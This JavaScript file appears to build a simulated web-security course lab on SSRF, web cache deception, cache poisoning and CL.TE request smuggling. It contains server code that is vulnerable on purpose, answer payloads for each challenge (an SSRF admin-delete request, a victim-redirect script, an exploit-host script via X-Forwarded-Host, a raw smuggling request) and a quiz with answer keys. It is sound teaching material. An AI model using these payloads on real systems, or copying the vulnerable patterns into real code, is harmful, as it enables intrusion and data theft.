// Web Applications Security · Week 4 — Web Application Architecture (intermediaries), PortSwigger style.
(() => {
  const { esc } = Web;
  const users = { wiener: { pass: "peter", key: Web.rid(32) }, carlos: { pass: Web.rid(10), key: Web.rid(32) }, administrator: { pass: Web.rid(10), key: Web.rid(32) } };
  const cache = {}; // key → { res, at }
  const deleted = new Set(); // challenge 1's admin panel (kept apart so carlos still exists for challenges 2–3)
  let carlosSid, smuggled = "";
  const TTL = 30000;

  const W = Web.lab({
    siteName: "Architecture Playground — Week 4",
    email: false,
    handle(req, res, srv) {
      // ---- front-end proxy (CL) + back-end (TE): request smuggling, challenge 4
      const cl = req.hv("content-length"), te = (req.hv("transfer-encoding") || "").toLowerCase();
      if (smuggled) { req.method = smuggled + req.method; smuggled = ""; }
      if (!/^(GET|POST|HEAD|OPTIONS|PUT|DELETE|PATCH)$/.test(req.method)) {
        if (/^G+POST$/.test(req.method)) srv.solve("c4", "Challenge 4 solved: the back-end saw GPOST — the request was smuggled");
        res.status = 403; res.type = "application/json; charset=utf-8"; res.body = `"Unrecognized method ${req.method}"`; return;
      }
      if (cl != null && te === "chunked" && req.via === "repeater") {
        const crlf = req.body.replace(/\n/g, "\r\n");
        const front = crlf.slice(0, +cl); // what the proxy forwards
        let i = 0, rest = front;
        for (;;) { // back-end parses chunks
          const nl = rest.indexOf("\r\n", i);
          if (nl < 0) break;
          const size = parseInt(rest.slice(i, nl), 16);
          if (isNaN(size)) break;
          if (size === 0) { i = nl + 2; if (rest.slice(i, i + 2) === "\r\n") i += 2; break; }
          i = nl + 2 + size + 2;
        }
        const left = rest.slice(i).replace(/\r\n/g, "");
        if (left) smuggled = left;
      }
      // ---- cache in front of the origin
      const s0 = srv.sessions[req.cookies.session];
      const cacheable = req.method === "GET" && (/\.(js|css|png|jpg|ico)$/.test(req.path) || req.path === "/");
      const key = req.path + (req.search || "");
      const hit = cacheable && cache[key] && Date.now() - cache[key].at < TTL;
      if (hit) {
        const c = cache[key];
        Object.assign(res, JSON.parse(JSON.stringify(c.res)));
        res.headers["X-Cache"] = "hit"; res.headers.Age = String(Math.floor((Date.now() - c.at) / 1000));
        return;
      }
      origin(req, res, srv, s0);
      if (cacheable && res.status === 200) {
        res.headers["Cache-Control"] = "max-age=30"; res.headers["X-Cache"] = "miss";
        cache[key] = { res: JSON.parse(JSON.stringify({ ...res, setCookies: [] })), at: Date.now() };
        if (req.path === "/" && /tracking\.js/.test(res.body) && !res.body.includes(`//${srv.HOST}/`)) scheduleVictimHome();
      }
    },
    onDialog(fn, v, where, srv) {
      if (where.who === "victim" && new URL(where.url).pathname === "/") srv.solve("c3", `Challenge 3 solved: the poisoned cache ran ${fn}() in the victim's browser`);
    },
    challenges: [{ id: "c1" }, { id: "c2" }, { id: "c3" }, { id: "c4" }],
  });
  function origin(req, res, srv, s0) {
    const s = srv.session(req, res);
    const p = req.path;
    if (p === "/") {
      const xfh = req.hv("x-forwarded-host") || srv.HOST; // unkeyed input, reflected
      res.body = srv.page("Home", `<h1>Week 4 — intermediaries</h1><script type="text/javascript" src="//${xfh}/resources/js/tracking.js"></script>
<ul><li><a href="/product?productId=1">1. Product page with a stock checker (SSRF)</a></li><li><a href="/my-account">2. My account (shows your API key)</a></li><li>3. This home page is cached for 30 s (see X-Cache in Burp)</li><li>4. A proxy (Content-Length) in front of a back-end (Transfer-Encoding)</li></ul>`, s);
      return;
    }
    if (p === "/resources/js/tracking.js") { res.type = "application/javascript"; res.body = "document.write('<img src=\"/resources/images/tracker.gif\">');"; return; }
    if (p.startsWith("/resources/")) { res.type = "image/gif"; res.body = "GIF89a"; return; }
    if (p === "/login") {
      if (req.method === "POST") { const u = req.form.username; if (users[u] && users[u].pass === req.form.password) { s.user = u; res.status = 302; res.headers.Location = "/my-account"; return; } res.body = srv.page("Login", "<p>Invalid username or password.</p>", s); return; }
      res.body = srv.page("Login", `<h1>Login</h1><form method="POST" action="/login"><label>Username</label><input type="text" name="username"><label>Password</label><input type="password" name="password"><button type="submit">Log in</button></form>`, s); return;
    }
    // ---- 2: path mapping: /my-account/anything → /my-account (origin), cache keys on .js
    if (p === "/my-account" || p.startsWith("/my-account/")) {
      if (!s.user) { res.status = 302; res.headers.Location = "/login"; return; }
      res.body = srv.page("My account", `<h1>My Account</h1><p>Your username is: ${esc(s.user)}</p><p>Your API Key is: <b>${users[s.user].key}</b></p>`, s);
      return;
    }
    if (p === "/submit-solution") {
      const ok = (req.form.answer || "").trim() === users.carlos.key;
      if (ok) srv.solve("c2", "Challenge 2 solved: carlos's API key leaked through the cache");
      res.body = srv.page("Solution", `<p>${ok ? "Correct!" : "Incorrect."}</p>`, s); return;
    }
    // ---- 1: SSRF
    if (p === "/product") {
      res.body = srv.page("Product", `<h1>Giant Pillow Thing</h1><p>$47.62</p><form method="POST" action="/product/stock"><input type="hidden" name="stockApi" value="http://stock.weliketoshop.net:8080/product/stock/check?productId=${esc(req.query.productId || 1)}&amp;storeId=1"><button type="submit">Check stock</button></form><p><small>Submit an API key for challenge 2 at <a href="/solution">/solution</a></small></p>`, s);
      return;
    }
    if (p === "/solution") { res.body = srv.page("Submit", `<form method="POST" action="/submit-solution"><label>Carlos's API key</label><input type="text" name="answer"><button type="submit">Submit solution</button></form>`, s); return; }
    if (p === "/product/stock" && req.method === "POST") {
      let u;
      try { u = new URL(req.form.stockApi); } catch { res.status = 400; res.body = '"Invalid stockApi"'; return; }
      res.type = "text/html; charset=utf-8";
      if (u.hostname === "stock.weliketoshop.net") { res.body = String(100 + Math.floor(Math.random() * 900)); return; }
      if (u.hostname === "localhost" || u.hostname === "127.0.0.1") {
        if (u.pathname === "/admin") { res.body = `<h1>Admin panel (internal)</h1>${["wiener", "carlos"].filter((x) => !deleted.has(x)).map((x) => `<p>${x} - <a href="/admin/delete?username=${x}">Delete</a></p>`).join("") || "<p>No users.</p>"}`; return; }
        if (u.pathname === "/admin/delete" && u.searchParams.get("username")) {
          deleted.add(u.searchParams.get("username"));
          if (u.searchParams.get("username") === "carlos") srv.solve("c1", "Challenge 1 solved: SSRF reached the internal admin panel and deleted carlos");
          res.status = 302; res.headers.Location = "/admin"; res.body = ""; return;
        }
        res.status = 404; res.body = '"Not Found"'; return;
      }
      if (u.hostname === "169.254.169.254") { res.type = "application/json"; res.body = JSON.stringify({ Code: "Success", Type: "AWS-HMAC", AccessKeyId: "ASIA" + Web.rid(16).toUpperCase(), SecretAccessKey: Web.rid(40), Token: "(simulated cloud credentials — Lecture 4: why SSRF is dangerous)" }, null, 2); return; }
      res.status = 500; res.body = '"Could not connect to external stock check service"'; return;
    }
    res.status = 404; res.body = srv.page("Not found", "<p>Not Found</p>", s);
  }
  let homeTimer = null;
  function scheduleVictimHome() { // the victim visits the home page a few seconds after it is (re)cached
    clearTimeout(homeTimer);
    homeTimer = setTimeout(() => W.victim.go("https://" + W.HOST + "/"), 2500);
  }
  // victim = carlos, logged in
  carlosSid = W.srv.rid(32); W.srv.sessions[carlosSid] = { user: "carlos", csrf: W.srv.rid(32) };
  W.victim.jar.set(W.HOST, `session=${carlosSid}; Secure; HttpOnly; SameSite=None`);
  const S = W.srv.solved;

  Lab.start({
    brief: `
<p>Four challenges about the <b>components around the application</b> (Week 4) in the style of <b>PortSwigger's Web Security Academy</b>: a server that fetches URLs, a cache in front of the origin, and a proxy in front of a back-end that parse requests differently. Your account: <code>wiener / peter</code>; the victim is <b>carlos</b>.</p>
<div class="tbl-wrap"><table class="tbl"><tr><th>#</th><th>PortSwigger lab it mirrors</th><th>Week 4 idea</th></tr>
<tr><td>1</td><td>Basic SSRF against the local server</td><td>Misplaced internal trust (A10)</td></tr>
<tr><td>2</td><td>Exploiting path mapping for web cache deception</td><td>Cache stores a private page</td></tr>
<tr><td>3</td><td>Web cache poisoning with an unkeyed header</td><td>Unkeyed input poisons shared content</td></tr>
<tr><td>4</td><td>HTTP request smuggling, basic CL.TE vulnerability</td><td>Proxy and back-end disagree</td></tr></table></div>
<p class="key">Watch the <code>X-Cache: hit / miss</code> and <code>Age</code> headers in Burp. The cache keeps responses for 30 seconds and keys only on the path + query string.</p>`,
    setup(api) { W.mount(api); },
    tasks: [
      { title: "1 · SSRF: delete carlos through the internal admin panel", detail: "The stock checker sends the server to a URL you control (<code>stockApi</code>). The admin panel is only reachable from localhost.", where: "Burp Repeater",
        hint: "Capture the Check stock request, change stockApi to http://localhost/admin, read the delete link, then request it the same way.", answer: "POST /product/stock HTTP/2\nHost: (lab host)\nContent-Type: application/x-www-form-urlencoded\n\nstockApi=http://localhost/admin/delete?username=carlos", check: () => S.c1 },
      { title: "2 · Web cache deception: steal carlos's API key", detail: "The origin serves /my-account for any /my-account/… path, but the cache stores anything ending in <code>.js</code>. Make carlos visit such a URL, then fetch it yourself before it expires. Submit his key at /solution.", where: "Exploit server + Browser",
        hint: "Test first as wiener: /my-account/abc.js twice → X-Cache miss then hit. Use a fresh name for carlos.", answer: `<script>document.location = "https://${W.HOST}/my-account/wcd.js";</script>\n\nThen open https://${W.HOST}/my-account/wcd.js yourself (within 30 s) and submit the API key at /solution`, check: () => S.c2 },
      { title: "3 · Poison the cached home page", detail: "The home page builds a script URL from <code>X-Forwarded-Host</code>, which the cache ignores. Host <code>alert(document.cookie)</code> at <code>/resources/js/tracking.js</code> on your exploit server, then poison the cache. The victim loads the home page right after it's cached.", where: "Exploit server + Burp Repeater",
        hint: "Exploit server: File = /resources/js/tracking.js, Body = alert(document.cookie), Store. Repeater: GET / with X-Forwarded-Host: your-exploit-host. If you get X-Cache: hit, wait for it to expire (or add ?cb=1 to test).", answer: "Exploit server › File: /resources/js/tracking.js\nBody: alert(document.cookie)\n\nGET / HTTP/2\nHost: (lab host)\nX-Forwarded-Host: (your exploit server host)", check: () => S.c3 },
      { title: "4 · Smuggle a request past the proxy (CL.TE)", detail: "The proxy uses Content-Length; the back-end uses Transfer-Encoding. Send a request whose body ends the chunked message early, leaving a <code>G</code> for the next request. Turn <b>off</b> “Update Content-Length”, then send it twice.", where: "Burp Repeater",
        hint: "Body is 0, blank line, G → 6 bytes with CRLF line endings, so Content-Length: 6.", answer: "POST / HTTP/1.1\nHost: (lab host)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG", check: () => S.c4 },
    ],
    doneText: "A server that trusted the inside, a cache that stored a private page, a cache that trusted an unkeyed header, and a proxy that disagreed with its back-end.",
    quiz: [
      { t: "match", q: "Match each tier to its job.", pairs: [["Presentation", "What the user sees and interacts with"], ["Application", "Business logic that decides what to do with input"], ["Data", "Persistent storage"]], src: "Lecture 4, three classic tiers" },
      { t: "mcq", q: "In MVC, where do input validation and authorization checks belong?", opts: ["Controller and Model, before business logic runs", "Only in the View", "In the CDN", "In the browser"], a: 0, src: "Lecture 4, MVC" },
      { t: "match", q: "Match each STRIDE letter.", pairs: [["S", "Spoofing"], ["T", "Tampering"], ["R", "Repudiation"], ["I", "Information disclosure"], ["D", "Denial of service"], ["E", "Elevation of privilege"]], src: "Lecture 4, STRIDE" },
      { t: "match", q: "Match the architectural boundary to its likely STRIDE threats.", pairs: [["Client → CDN/Proxy", "Tampering, Denial of Service"], ["Proxy → App server", "Spoofing, Information disclosure"], ["App server → Database", "Tampering, Elevation of privilege"], ["App → other microservices", "Spoofing, Elevation (fix: mTLS + Zero Trust)"]], src: "Lecture 4, STRIDE table" },
      { t: "mcq", q: "Web cache poisoning vs web cache deception — which is correct?", opts: ["Poisoning puts the attacker's response into a shared cached copy; deception makes the cache store a victim's private page", "Both mean the same thing", "Deception poisons shared content; poisoning exposes private data", "Neither involves a cache"], a: 0, src: "Lecture 4, cache attacks" },
      { t: "fill", q: "In challenge 3, the header that influenced the response but wasn't part of the cache key was ________.", a: ["X-Forwarded-Host"], src: "Lecture 4, Web Cache Poisoning" },
      { t: "mcq", q: "What is the classic CL.TE request-smuggling setup?", opts: ["The proxy uses Content-Length while the back-end uses Transfer-Encoding: chunked", "Both use Content-Length", "The proxy uses TLS and the back-end doesn't", "The back-end ignores the Host header"], a: 0, src: "Lecture 4, HTTP Request Smuggling" },
      { t: "short", q: "Why is request smuggling dangerous even if the proxy blocks /admin?", model: "The proxy's filters only see the outer request; the smuggled inner request is parsed by the back-end without ever passing through the proxy's checks. Fix: consistent parsing, HTTP/2 end-to-end.",
        keys: [["proxy", "filter"], ["inner", "smuggled", "hidden"], ["back-end", "backend"]], src: "Lecture 4, Request Smuggling" },
      { t: "mcq", q: "What does Zero Trust mean for microservices?", opts: ["No call is trusted because of where it came from; every service-to-service call is authenticated and authorized (e.g. mTLS)", "Internal traffic is trusted, external isn't", "Only the database is trusted", "Firewalls replace authentication"], a: 0, src: "Lecture 4, Zero Trust and mTLS" },
      { t: "mcq", q: "Why is 169.254.169.254 a classic SSRF target in the cloud?", opts: ["It's the instance metadata endpoint that can hand over cloud credentials", "It's the public DNS server", "It's the load balancer", "It's the CDN"], a: 0, src: "Lecture 4, SSRF" },
      { t: "match", q: "Match the database account to its privileges.", pairs: [["App read account", "SELECT only"], ["App write account", "SELECT, INSERT, UPDATE (no DROP/ALTER)"], ["Migration/admin account", "Full schema privileges, CI/CD only"]], src: "Lecture 4, Database-tier security" },
      { t: "mcq", q: "This week maps to which OWASP 2021 category?", opts: ["A04 Insecure Design", "A03 Injection", "A07 Authentication Failures", "A09 Logging Failures"], a: 0, src: "Lecture 4, Insecure Design" },
    ],
  });
})();
